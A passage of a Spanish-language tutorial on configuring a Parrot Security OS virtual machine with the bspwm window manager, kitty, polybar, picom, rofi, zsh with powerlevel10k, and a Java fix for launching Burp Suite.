    </ul>
  </li>
  <li><a href="#despliegue-de-polybar">Despliegue de Polybar</a></li>
  <li><a href="#configuración-de-picom">Configuración de Picom</a></li>
  <li><a href="#instalación-y-configuración-de-zsh-con-powerlevel10k">Instalación y Configuración de ZSH con Powerlevel10k</a>
    <ul>
      <li><a href="#instalación-de-zsh-plugins-y-powerlevel10k">Instalación de ZSH Plugins y Powerlevel10k</a></li>
      <li><a href="#personalización-del-prompt">Personalización del Prompt</a></li>
      <li><a href="#configuración-adicional-para-plugins-de-zsh">Configuración Adicional para Plugins de ZSH</a></li>
      <li><a href="#configuración-de-historial-y-completado">Configuración de Historial y Completado</a></li>
    </ul>
  </li>
  <li><a href="#instalación-y-configuración-de-bat-cat-y-lsd">Instalación y Configuración de Bat, Cat y LSD</a>
    <ul>
      <li><a href="#instalación-de-bat-y-lsd">Instalación de Bat y LSD</a></li>
      <li><a href="#configuración-de-alias-para-bat-y-lsd">Configuración de Alias para Bat y LSD</a></li>
    </ul>
  </li>
  <li><a href="#arreglo-para-burpsuite">Arreglo para Burpsuite</a>
    <ul>
      <li><a href="#actualizar-java-para-burpsuite">Actualizar Java para Burpsuite</a></li>
      <li><a href="#solución-al-problema-de-java">Solución al Problema de Java</a></li>
      <li><a href="#lanzador-para-burpsuite-desde-rofi">Lanzador para Burpsuite desde Rofi</a></li>
    </ul>
  </li>
  <li><a href="#configuración-de-polybar">Configuración de Polybar</a>
    <ul>
      <li><a href="#configuración-inicial-1">Configuración Inicial</a></li>
      <li><a href="#configuración-del-archivo-currentini">Configuración del Archivo current.ini</a></li>
      <li><a href="#creación-de-scripts-personalizados">Creación de Scripts Personalizados</a></li>
      <li><a href="#configuración-del-menú-de-energía-con-rofi">Configuración del Menú de Energía con Rofi</a></li>
      <li><a href="#funciones-personalizadas">Funciones Personalizadas</a></li>
    </ul>
  </li>
  <li><a href="#configuración-extra">Configuración Extra</a>
    <ul>
      <li><a href="#configuraciones-iniciales-del-sistema">Configuraciones Iniciales del Sistema</a></li>
      <li><a href="#picom-configuración-de-opacidad">Picom: Configuración de Opacidad</a></li>
      <li><a href="#ajustes-en-bspwmrc">Ajustes en bspwmrc</a></li>
      <li><a href="#slimlock">SlimLock</a></li>
      <li><a href="#configuración-de-nano">Configuración de Nano</a></li>
      <li><a href="#arreglo-para-conexión-de-red-en-vmware">Arreglo para Conexión de Red en VMware</a></li>
      <li><a href="#instalación-de-whichsystempy">Instalación de whichSystem.py</a></li>
      <li><a href="#instalación-de-fasttcpscan">Instalación de fastTCPScan</a></li>
    </ul>
  </li>
  <li><a href="#configuración-de-nvchad-y-neovim">Configuración de NvChad y Neovim</a>
    <ul>
      <li><a href="#instalación-de-nvchad-y-neovim-1">Instalación de NvChad y Neovim</a></li>
      <li><a href="#configuración-inicial-de-nvchad">Configuración Inicial de NvChad</a></li>
      <li><a href="#atajos-útiles-en-nvchad">Atajos Útiles en NvChad</a></li>
      <li><a href="#configuración-de-rofi-y-i3lock">Configuración de Rofi y i3lock</a></li>
      <li><a href="#configuración-adicional-1">Configuración Adicional</a></li>
    </ul>
  </li>
  <li><a href="#configuración-de-firefox">Configuración de Firefox</a>
    <ul>
      <li><a href="#instalación-de-firefox-1">Instalación de Firefox</a></li>
      <li><a href="#configuración-inicial-en-firefox">Configuración Inicial en Firefox</a></li>
      <li><a href="#extensiones-recomendadas">Extensiones Recomendadas</a></li>
      <li><a href="#configuración-del-certificado-para-burpsuite">Configuración del Certificado para BurpSuite</a></li>
      <li><a href="#limpieza-de-descargas">Limpieza de Descargas</a></li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="instalación-del-sistema-operativo">Instalación del Sistema Operativo</h2>

<h3 id="instalación-de-software-de-virtualización">Instalación de Software de Virtualización</h3>

<ol>
  <li>Descargar e instalar uno de los siguientes programas:
    <ul>
      <li><strong>VirtualBox:</strong> <a href="https://www.virtualbox.org">https://www.virtualbox.org</a></li>
      <li><strong>VMware:</strong> <a href="https://www.vmware.com">https://www.vmware.com</a></li>
    </ul>
  </li>
</ol>

<h3 id="configuración-de-la-máquina-virtual-en-vmware">Configuración de la Máquina Virtual en VMware</h3>

<ol>
  <li>Crear una nueva máquina virtual:
    <ul>
      <li>Navegar a: <strong>File → New Virtual Machine</strong>.</li>
      <li>Seleccionar <strong>Typical</strong>.</li>
      <li>Elegir la opción: <strong>Installer disk image file (ISO)</strong> y cargar la imagen de Parrot Security OS descargada desde <a href="https://parrotsec.org/download">https://parrotsec.org/download</a>.<br />
<em>Nota: Se debe escoger la Security Edition en formato .iso para 64 bits.</em></li>
    </ul>
  </li>
  <li>Configuración de hardware:
    <ul>
      <li><strong>Nombre de la máquina virtual:</strong> RuyzTzOS.</li>
      <li><strong>Tamaño máximo del disco:</strong> 80 GB.</li>
      <li><strong>Configuración de disco:</strong> Store virtual disk as a single file.</li>
      <li><strong>Personalizar el hardware:</strong>
        <ul>
          <li>Memoria: 16 GB (o 8 GB con 2 núcleos si se requiere menos).</li>
          <li>Procesadores: 4 procesadores con 4 núcleos cada uno.</li>
          <li>Adaptador de red: Configurar en modo <strong>Bridged</strong> y habilitar la opción “Replicate physical network connection state”.</li>
          <li>Pantalla: Habilitar <strong>Accelerated 3D Graphics</strong> y asignar la memoria máxima de video disponible.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Guardar los cambios y finalizar la configuración.</li>
</ol>

<h3 id="instalación-del-sistema-operativo-en-la-máquina-virtual">Instalación del Sistema Operativo en la Máquina Virtual</h3>

<ol>
  <li>Iniciar la máquina virtual y seleccionar <strong>Try/Install</strong>.</li>
  <li>Doble clic en <strong>Install Parrot Security</strong>.</li>
  <li>Configuración inicial:
    <ul>
      <li><strong>Idioma:</strong> Español de España.</li>
      <li><strong>Ubicación:</strong> Madrid.</li>
      <li><strong>Teclado:</strong> Español Default (comprobar funcionalidad).</li>
    </ul>
  </li>
  <li>Configuración del disco:
    <ul>
      <li>Seleccionar <strong>Borrar disco</strong>, sin swap y cifrar disco.</li>
      <li>Usar una contraseña sin caracteres especiales para evitar problemas con el teclado en inglés.</li>
    </ul>
  </li>
  <li>Completar los datos del usuario y proceder con la instalación.</li>
  <li>Al finalizar, reiniciar el sistema.</li>
</ol>

<h3 id="configuración-inicial">Configuración Inicial</h3>

<ol>
  <li>Eliminar el archivo <strong>README</strong> del escritorio.</li>
  <li>Crear una carpeta con vuestro nombre en el escritorio.</li>
  <li>
    <p><strong>Nota importante:</strong> Nunca ejecutar <code class="language-plaintext highlighter-rouge">sudo apt upgrade</code>. En su lugar, usar:</p>

    <p>sudo apt update<br />
 sudo parrot=upgrade</p>
  </li>
  <li>Solución de errores comunes:
    <ul>
      <li>Si aparece un error de configuración duplicada en <code class="language-plaintext highlighter-rouge">/etc/apt/sources.list</code>, abrir el archivo y comentar la línea problemática.</li>
      <li>
        <p>Ver posibles eliminaciones antes de ejecutar <code class="language-plaintext highlighter-rouge">autoremove</code>:</p>

        <p>sudo apt autoremove ==dry=run</p>
      </li>
      <li>
        <p>Para eliminar un paquete específico:</p>

        <p>sudo apt remove packageName</p>
      </li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="instalación-y-configuración-de-bspwm-y-sxhkd">Instalación y Configuración de BSPWM y SXHKD</h2>

<h3 id="instalación-de-dependencias">Instalación de Dependencias</h3>

<ol>
  <li>
    <p>Como <strong>root</strong>, instalar las siguientes dependencias:</p>

    <p>sudo apt install build-essential git vim libxcb-util0-dev libxcb-ewmh-dev libxcb-randr0-dev libxcb-icccm4-dev libxcb-keysyms1-dev libxcb-xinerama0-dev libasound2-dev libxcb-xtest0-dev libxcb-shape0-dev<br />
 sudo apt install bspwm</p>
  </li>
</ol>

<h3 id="instalación-de-bspwm-y-sxhkd">Instalación de BSPWM y SXHKD</h3>

<ol>
  <li>
    <p>Como usuario, descargar los repositorios y compilar:</p>

    <p>cd ~/Descargas<br />
 git clone https://github.com/baskerville/bspwm.git<br />
 git clone https://github.com/baskerville/sxhkd.git</p>
  </li>
  <li>
    <p>Compilar e instalar <strong>bspwm</strong>:</p>

    <p>cd bspwm<br />
 make<br />
 sudo make install</p>
  </li>
  <li>
    <p>Compilar e instalar <strong>sxhkd</strong>:</p>

    <p>cd ../sxhkd<br />
 make<br />
 sudo make install</p>
  </li>
  <li>
    <p>Crear directorios de configuración:</p>

    <p>mkdir ~/.config/bspwm<br />
 mkdir ~/.config/sxhkd</p>
  </li>
  <li>
    <p>Copiar los archivos de configuración de ejemplo:</p>

    <p>cp ~/Descargas/bspwm/examples/bspwmrc ~/.config/bspwm/<br />
 cp ~/Descargas/bspwm/examples/sxhkdrc ~/.config/sxhkd/<br />
 chmod +x ~/.config/bspwm/bspwmrc</p>
  </li>
</ol>

<hr />

<h2 id="instalación-y-configuración-de-kitty">Instalación y Configuración de Kitty</h2>

<h3 id="modificaciones-en-el-archivo-sxhkdrc">Modificaciones en el Archivo sxhkdrc</h3>

<ol>
  <li>
    <p>Instalar el terminal <strong>Kitty</strong>:</p>

    <p>sudo apt install kitty<br />
 which kitty</p>
  </li>
  <li>Copiar la ruta proporcionada por <code class="language-plaintext highlighter-rouge">which kitty</code> para usarla en la configuración posterior.</li>
  <li>
    <p>Editar el archivo <code class="language-plaintext highlighter-rouge">sxhkdrc</code>:</p>

    <p>nano ~/.config/sxhkd/sxhkdrc</p>
  </li>
  <li>Realizar las siguientes modificaciones:
    <ul>
      <li>
        <p>Cambiar el terminal por la ruta obtenida de <code class="language-plaintext highlighter-rouge">which kitty</code>:</p>

        <p>super + Return<br />
       $pathKitty</p>
      </li>
      <li>
        <p>Configurar atajos para reiniciar o cerrar BSPWM:</p>

        <p>super + shift + {q, r}</p>
      </li>
      <li>
        <p>Cambiar la navegación direccional a:</p>

        <p>{Left, Down, Up, Right}</p>
      </li>
      <li>
        <p>Añadir la funcionalidad de redimensionar ventanas:</p>

        <p># Custom Resize<br />
   super + alt + {Left, Down, Up, Right}<br />
       ~/.config/bspwm/scripts/bspwm_resize {west, south, north, east}</p>
      </li>
      <li>
        <p>Abrir Firefox:</p>

        <p>super + shift + f<br />
       /usr/bin/firefox</p>
      </li>
    </ul>
  </li>
  <li>Guardar los cambios con <strong>Ctrl+S</strong> y salir con <strong>Ctrl+X</strong>.</li>
</ol>

<h3 id="creación-del-script-de-redimensionado">Creación del Script de Redimensionado</h3>

<ol>
  <li>
    <p>Crear el directorio y archivo para el script:</p>

    <p>mkdir ~/.config/bspwm/scripts<br />
 touch ~/.config/bspwm/scripts/bspwm_resize<br />
 chmod +x ~/.config/bspwm/scripts/bspwm_resize</p>
  </li>
  <li>
    <p>Editar el archivo <code class="language-plaintext highlighter-rouge">bspwm_resize</code>:</p>

    <p>nano ~/.config/bspwm/scripts/bspwm_resize</p>
  </li>
  <li>
    <p>Añadir el siguiente contenido al script:</p>

    <p>#!/usr/bin/env dash</p>

    <p>if bspc query -N -n focused.floating &gt; /dev/null; then
     step=20
 else
     step=100
 fi</p>

    <p>case “$1” in
     west)  dir=right; fallback=left; x=”$step”; y=0 ;;
     east)  dir=right; fallback=left; x=”$step”; y=0 ;;
     north) dir=top;   fallback=bottom; x=0; y=”$step” ;;
     south) dir=top;   fallback=bottom; x=0; y=”$step” ;;
 esac</p>

    <table>
      <tbody>
        <tr>
          <td>bspc node -z “$dir” “$x” “$y”</td>
          <td> </td>
          <td>bspc node -z “$fallback” “$x” “$y”</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <p>Guardar y salir.</p>
  </li>
</ol>

<hr />

<h2 id="instalación-y-configuración-de-polybar-picom-y-rofi">Instalación y Configuración de Polybar, Picom y Rofi</h2>

<h3 id="instalación-de-polybar">Instalación de Polybar</h3>

<ol>
  <li>
    <p>Como <strong>root</strong>, instalar <strong>Polybar</strong>:</p>

    <p>sudo apt install polybar</p>
  </li>
</ol>

<h3 id="instalación-de-picom">Instalación de Picom</h3>

<ol>
  <li>
    <p>Navegar al repositorio oficial de Picom para revisar las dependencias:<br />
<a href="https://github.com/yshui/picom">https://github.com/yshui/picom</a></p>
  </li>
  <li>
    <p>Instalar las dependencias requeridas:</p>

    <p>sudo apt install libconfig-dev libdbus-1-dev libegl1-mesa-dev libeglib-dev libepoxy-dev libpcre2-dev libx11-xcb-dev libxcb-composite0-dev libxcb-damage0-dev libxcb-glx0-dev libxcb-image0-dev libxcb-present-dev libxcb-randr0-dev libxcb-render0-dev libxcb-render-util0-dev libxcb-shape0-dev libxcb-util-dev libxcb-xfixes0-dev meson ninja-build uthash-dev -y<br />
 sudo apt update</p>
  </li>
  <li>
    <p>Clonar y compilar <strong>Picom</strong>:</p>

    <p>su ruyztz<br />
 cd ~/Descargas<br />
 git clone https://github.com/yshui/picom<br />
 cd picom</p>

    <p># Comprobar si Meson está instalado:
 which meson</p>

    <p># Configurar y compilar:
 meson setup –buildtype=release build<br />
 # Si falla por cmake:
 sudo apt install cmake<br />
 ninja -C build<br />
 sudo ninja -C build install</p>
  </li>
</ol>

<h3 id="instalación-de-rofi">Instalación de Rofi</h3>

<ol>
  <li>
    <p>Instalar <strong>Rofi</strong>:</p>

    <p>sudo apt install rofi</p>
  </li>
  <li>
    <p>Probar Rofi:</p>

    <p>rofi -show run</p>

    <p>Esto abrirá la interfaz de Rofi para lanzar programas.</p>
  </li>
</ol>

<h3 id="configuración-en-sxhkdrc">Configuración en sxhkdrc</h3>

<ol>
  <li>
    <p>Editar el archivo de configuración de <strong>SXHKD</strong>:</p>

    <p>nano ~/.config/sxhkd/sxhkdrc</p>
  </li>
  <li>
    <p>Añadir la línea para lanzar Rofi:</p>

    <p># Program launcher<br />
 super + d<br />
     /usr/bin/rofi -show run</p>
  </li>
  <li>
    <p>Guardar y salir con <strong>Ctrl+S</strong> y <strong>Ctrl+X</strong>.</p>
  </li>
</ol>

<h3 id="prueba-del-entorno">Prueba del Entorno</h3>

<ol>
  <li>En el panel de login, seleccionar <strong>BSPWM</strong> haciendo clic en el icono circular.</li>
  <li>Iniciar sesión; el entorno se verá negro inicialmente.</li>
  <li>Probar los siguientes atajos para verificar la configuración:
    <ul>
      <li>Abrir terminal (super + Return), ponerla en modo flotante, redimensionar con super + alt + flechas.</li>
      <li>Abrir Rofi con super + d.</li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="instalación-y-configuración-de-fuentes-kitty-y-feh">Instalación y Configuración de Fuentes, Kitty y Feh</h2>

<h3 id="instalación-de-fuentes-nerd">Instalación de Fuentes Nerd</h3>

<ol>
  <li>
    <p>Descargar la fuente <strong>Hack Nerd Font</strong> desde:<br />
<a href="https://www.nerdfonts.com/font-downloads">Nerd Fonts</a></p>
  </li>
  <li>
    <p>Como <strong>root</strong>, mover el archivo descargado:</p>

    <p>cd /usr/local/share/fonts<br />
 mv /home/ruyztz/Descargas/Hack.zip .<br />
 7z x Hack.zip<br />
 rm Hack.zip LICENSE.md README.md</p>
  </li>
</ol>

<h3 id="instalación-de-kitty">Instalación de Kitty</h3>

<ol>
  <li>
    <p>Descargar la última versión de <strong>Kitty</strong> desde:<br />
<a href="https://github.com/kovidgoyal/kitty/releases">Kitty Releases</a></p>
  </li>
  <li>
    <p>Proceder con la instalación:</p>

    <p>sudo apt remove kitty<br />
 cd /opt<br />
 mv /home/ruyztz/Descargas/kitty…txz .<br />
 7z x kitty…<br />
 rm kitty…  # Elimina el archivo descargado<br />
 mkdir kitty<br />
 mv kitty…tar kitty/<br />
 cd kitty<br />
 tar -xf kitty…tar<br />
 rm kitty…tar</p>
  </li>
  <li>
    <p>Configurar el atajo en <strong>sxhkdrc</strong>:</p>

    <p>nano ~/.config/sxhkd/sxhkdrc</p>

    <p># Cambiar la línea para lanzar Kitty:
 super + Return<br />
     /opt/kitty/bin/kitty</p>
  </li>
  <li>Guardar los cambios (Ctrl+S, Ctrl+X), salir y reiniciar el entorno.</li>
  <li>
    <p>Comprobar la instalación:</p>

    <p>kitty –version</p>
  </li>
</ol>

<h3 id="configuración-de-kitty">Configuración de Kitty</h3>

<ol>
  <li>
    <p>Crear y editar el archivo de configuración:</p>

    <p>nano ~/.config/kitty/kitty.conf</p>
  </li>
  <li>
    <p>Añadir la siguiente configuración:</p>

    <p>enable_audio_bell no<br />
 include color.ini<br />
 font_family HackNerdFont<br />
 font_size 13<br />
 disable_ligatures never<br />
 url_color #61afef<br />
 url_style curly<br />
 background_opacity 0.95<br />
 shell zsh<br />
 map ctrl+shift+t new tab with cwd<br />
 map ctrl+shift+enter new window with cwd</p>
  </li>
  <li>
    <p>Crear el archivo de colores personalizado:</p>

    <p>nano ~/.config/kitty/color.ini</p>
  </li>
  <li>
    <p>Añadir los colores:</p>

    <p>foreground #a9b1d6<br />
 background #1a1b26<br />
 color0 #414868<br />
 color1 #f7768e<br />
 # Añadir las definiciones para cada color según el ejemplo proporcionado.</p>
  </li>
</ol>

<h3 id="instalación-y-configuración-de-feh">Instalación y Configuración de Feh</h3>

<ol>
  <li>
    <p>Instalar las herramientas necesarias:</p>

    <p>sudo apt install imagemagick ranger feh</p>
  </li>
  <li>
    <p>Crear un directorio para los fondos:</p>

    <p>mkdir ~/Desktop/ruyztz/Fondos</p>
  </li>
  <li>
    <p>Añadir el fondo de pantalla en el directorio y configurar Feh:</p>

    <p>echo ‘/usr/bin/feh –bg-fill /home/ruyztz/Desktop/ruyztz/Fondos/fondo.jpg &amp;’ » ~/.config/bspwm/bspwmrc</p>
  </li>
  <li>
    <p>Reiniciar el entorno para aplicar los cambios (super + shift + q).</p>
  </li>
</ol>

<h3 id="configuración-de-z-shell-zsh">Configuración de Z Shell (Zsh)</h3>

<ol>
  <li>
    <p>Cambiar el shell predeterminado para el usuario y root:</p>

    <p>sudo usermod –shell /usr/bin/zsh root<br />
 sudo usermod –shell /usr/bin/zsh ruyztz</p>
  </li>
  <li>
    <p>Copiar la configuración de Kitty a root:</p>

    <p>sudo cp /home/ruyztz/.config/kitty/* /root/.config/kitty/</p>
  </li>
</ol>

<hr />

<h2 id="despliegue-de-polybar">Despliegue de Polybar</h2>

<ol>
  <li>
    <p>Clonar el repositorio de configuración:</p>

    <p>cd /home/ruyztz/Descargas<br />
 git clone https://github.com/VaughnValle/blue-sky.git</p>
  </li>
  <li>
    <p>Copiar la configuración de Polybar:</p>

    <p>cd blue-sky/polybar<br />
 cp -r * ~/.config/polybar</p>
  </li>
  <li>
    <p>Añadir el comando para iniciar Polybar en el archivo <code class="language-plaintext highlighter-rouge">bspwmrc</code>:</p>

    <p>echo ‘~/.config/polybar/./launch.sh &amp;’ » ~/.config/bspwm/bspwmrc</p>
  </li>
  <li>
    <p>Instalar las fuentes necesarias:</p>

    <p>sudo su<br />
 cp fonts/* /usr/share/fonts/truetype/<br />
 fc-cache -v</p>
  </li>
  <li>
    <p>Reiniciar el entorno para aplicar los cambios:</p>

    <p>window shift r</p>
  </li>
</ol>

<hr />

<h2 id="configuración-de-picom">Configuración de Picom</h2>

<ol>
  <li>
    <p>Añadir Picom al archivo <code class="language-plaintext highlighter-rouge">bspwmrc</code> para ejecutarlo al iniciar el sistema:</p>

    <p>echo ‘picom &amp;’ » ~/.config/bspwm/bspwmrc</p>
  </li>
  <li>
    <p>Configurar los bordes de las ventanas:</p>

    <p>echo ‘bspc config border_width 1’ » ~/.config/bspwm/bspwmrc</p>
  </li>
  <li>
    <p>Para habilitar bordes redondeados y sombras experimentales:</p>

    <p>echo ‘picom –experimental-backends &amp;’ » ~/.config/bspwm/bspwmrc</p>
  </li>
  <li>
    <p>Para abrir ventanas de Tk como flotantes automáticamente:</p>

    <p>echo ‘bspc rule -a Tk state=floating’ » ~/.config/bspwm/bspwmrc</p>
  </li>
  <li>
    <p>Crear el directorio de configuración y editar el archivo de configuración de Picom:</p>

    <p>mkdir ~/.config/picom<br />
 cd ~/.config/picom<br />
 nano picom.conf</p>
  </li>
  <li>
    <p>Añadir la siguiente configuración (por ejemplo):</p>

    <p>##############################################################################
 # CORNERS
 ##############################################################################
 corner_radius = 20;
 rounded_corners_exclude = [
     #”class_g = ‘firefox’”,
 ];
 round_borders = 20;
 round_borders_exclude = [
     #”class_g = ‘TelegramDesktop’”,
 ];</p>

    <p>##############################################################################
 # SHADOWS
 ##############################################################################
 shadow = true;
 shadow_radius = 15;
 shadow_opacity = 0.5;
 shadow_offset_x = 15;
 shadow_offset_y = 15;
 shadow_exclude = [
     “class_g = ‘firefox’ &amp;&amp; argb”,
 ];</p>

    <p>##############################################################################
 # FADING
 ##############################################################################
 fade_in_step = 0.01;
 fade_out_step = 0.01;</p>

    <p>##############################################################################
 # OPACITY
 ##############################################################################
 inactive_opacity = 1.0;
 frame_opacity = 1.0;
 active_opacity = 1.0;
 inactive_opacity_override = false;</p>

    <p>##############################################################################
 # BLUR
 ##############################################################################
 blur_method = “dual_kawase”;
 blur_size = 2;
 blur_strength = 3;
 blur_background = true;</p>

    <p>##############################################################################
 # GENERAL
 ##############################################################################
 backend = “glx”;
 vsync = false;
 detect_rounded_corners = true;
 detect_client_opacity = true;
 refresh_rate = 0;</p>

    <p>wintypes:
 {
     tooltip = { fade = true; shadow = true; opacity = 0.8; };
     dropdown_menu = { shadow = false; };
     popup_menu = { shadow = false; };
 }</p>
  </li>
  <li>
    <p>Guardar los cambios y reiniciar el entorno.</p>
  </li>
</ol>

<hr />

<h2 id="instalación-y-configuración-de-zsh-con-powerlevel10k">Instalación y Configuración de ZSH con Powerlevel10k</h2>

<h3 id="instalación-de-zsh-plugins-y-powerlevel10k">Instalación de ZSH Plugins y Powerlevel10k</h3>

<ol>
  <li>
    <p>Instalar plugins para ZSH:</p>

    <p>sudo apt install zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete -y</p>
  </li>
  <li>
    <p>Descargar <strong>Powerlevel10k</strong> desde su repositorio oficial:</p>

    <p>git clone –depth=1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k<br />
 echo ‘source ~/powerlevel10k/powerlevel10k.zsh-theme’ » ~/.zshrc</p>
  </li>
  <li>
    <p>Iniciar ZSH y configurar Powerlevel10k:</p>

    <p>zsh<br />
 p10k configure</p>

    <p>Siga las opciones del asistente de configuración:</p>
    <ul>
      <li>¿Ves el diamante? → Sí</li>
      <li>¿Ves el candado? → Sí</li>
      <li>¿Ves la flecha? → Sí</li>
      <li>¿Ves los iconos? → Sí</li>
      <li>Seleccionar <strong>Clásico: 2</strong></li>
      <li><strong>Unicode: 1</strong></li>
      <li><strong>Tema claro: 2</strong></li>
      <li>¿Incluir hora? → No</li>
      <li><strong>Estilo angled: 1</strong></li>
      <li><strong>Estilo sharp: 3</strong></li>
      <li><strong>Estilo slanted: 4</strong></li>
      <li><strong>Una línea: 1</strong></li>
      <li><strong>Sparse: 2</strong></li>
      <li><strong>Muchos iconos: 2</strong></li>
      <li><strong>Conciso: 2</strong></li>
      <li><strong>Fluido: 2</strong></li>
      <li>¿Prompt transitorio? → No</li>
      <li><strong>Verbose: 1</strong></li>
      <li>Aplicar cambios: Sí</li>
    </ul>
  </li>
</ol>

<h3 id="personalización-del-prompt">Personalización del Prompt</h3>

<ol>
  <li>
    <p>Editar el archivo de configuración de Powerlevel10k:</p>

    <p>nano ~/.p10k.zsh</p>
  </li>
  <li>
    <p>Realizar los siguientes cambios:</p>
    <ul>
      <li>
        <p>Vaciar los elementos del <code class="language-plaintext highlighter-rouge">POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS</code>:</p>

        <p>POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=()</p>
      </li>
      <li>
        <p>Personalizar los elementos del <code class="language-plaintext highlighter-rouge">POWERLEVEL9K_LEFT_PROMPT_ELEMENTS</code>:</p>

        <p>POWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(
     context
     command_execution_time
     status
   )</p>
      </li>
      <li>
        <p>Agregar configuraciones adicionales:</p>

        <p>typeset -g POWERLEVEL9K_DIR_ANCHOR_BOLD=false
   typeset -g POWERLEVEL9K_CONTEXT_PREFIX=’ ‘
   typeset -g POWERLEVEL9K_CONTEXT_ROOT_TEMPLATE=’ Alien Icon ‘</p>
      </li>
    </ul>
  </li>
</ol>

<h3 id="configuración-adicional-para-plugins-de-zsh">Configuración Adicional para Plugins de ZSH</h3>

<ol>
  <li>
    <p>Crear y configurar el archivo <code class="language-plaintext highlighter-rouge">sudo.plugin.zsh</code>:</p>

    <p>cd /usr/local/share<br />
 mkdir zsh-sudo<br />
 cd zsh-sudo<br />
 nano sudo.plugin.zsh</p>

    <p>(Añadir el código del plugin sudo según se requiera.)</p>
  </li>
  <li>
    <p>Actualizar el archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> para incluir los plugins:</p>

    <p>nano ~/.zshrc</p>

    <p>if [ -f /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
     source /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh
 fi</p>

    <p>if [ -f /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
     source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
 fi</p>

    <p>if [ -f /usr/local/share/zsh-sudo/sudo.plugin.zsh ]; then
     source /usr/local/share/zsh-sudo/sudo.plugin.zsh
 fi</p>
  </li>
  <li>
    <p>Aplicar cambios y probar:</p>

    <p>source ~/.zshrc</p>
  </li>
</ol>

<h3 id="configuración-de-historial-y-completado">Configuración de Historial y Completado</h3>

<ol>
  <li>
    <p>Configurar el historial:</p>

    <p>HISTFILE=~/.zsh_history
 HISTSIZE=10000
 SAVEHIST=10000
 setopt hist_ignore_all_dups share_history</p>
  </li>
  <li>
    <p>Habilitar el sistema moderno de autocompletado:</p>

    <p>autoload -Uz compinit
 compinit</p>
  </li>
</ol>

<hr />

<h2 id="instalación-y-configuración-de-bat-cat-y-lsd">Instalación y Configuración de Bat, Cat y LSD</h2>

<h3 id="instalación-de-bat-y-lsd">Instalación de Bat y LSD</h3>

<ol>
  <li>Descargar las últimas versiones:
    <ul>
      <li><strong>Bat:</strong> <a href="https://github.com/sharkdp/bat/releases">https://github.com/sharkdp/bat/releases</a></li>
      <li><strong>LSD:</strong> <a href="https://github.com/lsd-rs/lsd/releases">https://github.com/lsd-rs/lsd/releases</a></li>
    </ul>
  </li>
  <li>
    <p>Instalar los paquetes descargados:</p>

    <p>sudo dpkg -i bat_0.18.0_amd64.deb<br />
 sudo dpkg -i lsd_0.20.1_amd64.deb</p>
  </li>
</ol>

<h3 id="configuración-de-alias-para-bat-y-lsd">Configuración de Alias para Bat y LSD</h3>

<ol>
  <li>
    <p>Editar el archivo <code class="language-plaintext highlighter-rouge">.zshrc</code>:</p>

    <p>nano ~/.zshrc</p>
  </li>
  <li>
    <p>Añadir las siguientes líneas para configurar alias personalizados:</p>

    <p># Custom Aliases
 # Bat
 alias cat=’bat’
 alias catn=’bat –style=plain’
 alias catnp=’bat –style=plain –paging=never’</p>

    <p># LSD
 alias ll=’lsd -lh –group-dirs=first’
 alias la=’lsd -a –group-dirs=first’
 alias l=’lsd –group-dirs=first’
 alias lla=’lsd -lha –group-dirs=first’
 alias ls=’lsd –group-dirs=first’</p>

    <p>export LS_COLORS=”rs=0:di=34:ln=01;36:mh=00:pi=40;33:…”</p>
  </li>
  <li>
    <p>Guardar los cambios y aplicar:</p>

    <p>source ~/.zshrc</p>
  </li>
</ol>

<hr />

<h2 id="arreglo-para-burpsuite">Arreglo para Burpsuite</h2>

<h3 id="actualizar-java-para-burpsuite">Actualizar Java para Burpsuite</h3>

<ol>
  <li>
    <p>Descargar y configurar <strong>OpenJDK 21</strong>:</p>

    <p>cd /home/ruyztz/Descargas<br />
 wget https://download.java.net/java/GA/jdk21.0.2/f2283984656d49d69e91c558476027ac/13/GPL/openjdk-21.0.2_linux-x64_bin.tar.gz<br />
 tar xvf openjdk-21.0.2_linux-x64_bin.tar.gz<br />
 sudo mv jdk-21.0.2/ /usr/lib/jvm/jdk-21</p>
  </li>
  <li>
    <p>Modificar el lanzador de Burpsuite:</p>

    <p>sudo nano /usr/bin/burpsuite</p>

    <p>Reemplazar:</p>

    <p>/usr/lib/jvm/java-17-openjdk-$(dpkg-architecture -q DEB_HOST_ARCH)/bin/java</p>

    <p>por:</p>

    <p>/usr/lib/jvm/jdk-21/bin/java</p>
  </li>
</ol>

<h3 id="solución-al-problema-de-java">Solución al Problema de Java</h3>

<ol>
  <li>
    <p>Añadir las siguientes líneas al archivo <code class="language-plaintext highlighter-rouge">.zshrc</code>:</p>

    <p>nano ~/.zshrc</p>

    <p># Fix Java Problem
 export JAVA_AWT_WM_NONREPARENTING=1</p>
  </li>
  <li>
    <p>Añadir al archivo <code class="language-plaintext highlighter-rouge">bspwmrc</code> para corregir el problema de WMName:</p>

    <p>echo ‘wmname LG3D &amp;’ » ~/.config/bspwm/bspwmrc</p>
  </li>
</ol>

<h3 id="lanzador-para-burpsuite-desde-rofi">Lanzador para Burpsuite desde Rofi</h3>

<ol>
  <li>
    <p>Crear un lanzador en <code class="language-plaintext highlighter-rouge">/usr/bin</code>:</p>

    <p>cd /usr/bin<br />
 sudo touch burpsuite-launcher<br />
 sudo chmod +x burpsuite-launcher<br />
 nano burpsuite-launcher</p>
  </li>
  <li>
    <p>Añadir el siguiente contenido:</p>

    <p>#!/bin/bash
 export JAVA_AWT_WM_NONREPARENTING=1
 wmname LG3D &amp;
 /usr/bin/burpsuite</p>
  </li>
  <li>
    <p>Guardar y cerrar.</p>
  </li>
</ol>

<hr />

<h2 id="configuración-de-polybar">Configuración de Polybar</h2>

<h3 id="configuración-inicial-1">Configuración Inicial</h3>

<ol>
  <li>
    <p>Editar el archivo <code class="language-plaintext highlighter-rouge">launch.sh</code>:</p>

    <p>cd ~/.config/polybar/<br />
 nano launch.sh</p>
  </li>
  <li>
